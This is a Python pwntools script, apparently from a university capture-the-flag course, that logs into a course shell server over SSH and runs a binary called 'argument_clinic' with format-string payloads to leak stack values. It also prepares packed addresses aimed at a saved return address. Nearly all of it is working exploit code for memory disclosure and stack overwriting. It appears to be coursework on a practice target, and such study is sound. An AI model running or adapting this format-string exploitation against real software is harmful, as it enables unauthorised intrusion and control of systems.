from pwn import *

# debug info
bin64 = './argument_clinic'

# remote variables
name = 'ahwech'
host = 'cs4401shell.walls.ninja'
keyfile = '../../onyx_ssh_key'
d = '/problems/argument-clinic_3_499397cabc327f6aa99ca6c8eba57582/'

# helper vars
retaddroffset = 0xe0
stackarg = 0x7fffffffecf8
pretaddr = stackarg - retaddroffset
envstr = flat(
p64(pretaddr + 16),
p64(pretaddr),
p64(pretaddr + 2),
p64(pretaddr + 4),
p64(pretaddr + 8),
p64(pretaddr + 12),
p64(pretaddr + 20),
p64(pretaddr + 18),
p64(pretaddr + 10))

# 2D799
s = ssh(name, host, keyfile=keyfile)
s.set_working_directory(d)
for i in range(300):
	with context.silent:
		exploit = flat({
		0: b'%' + str(i).encode('utf-8') + b'$p',
		95: b'a'})
		p = s.process([bin64, exploit])
		p.recvuntil(': ')
	log.info(f'Arg{i}: {p.recvline(timeout=1).strip()[:18]}')
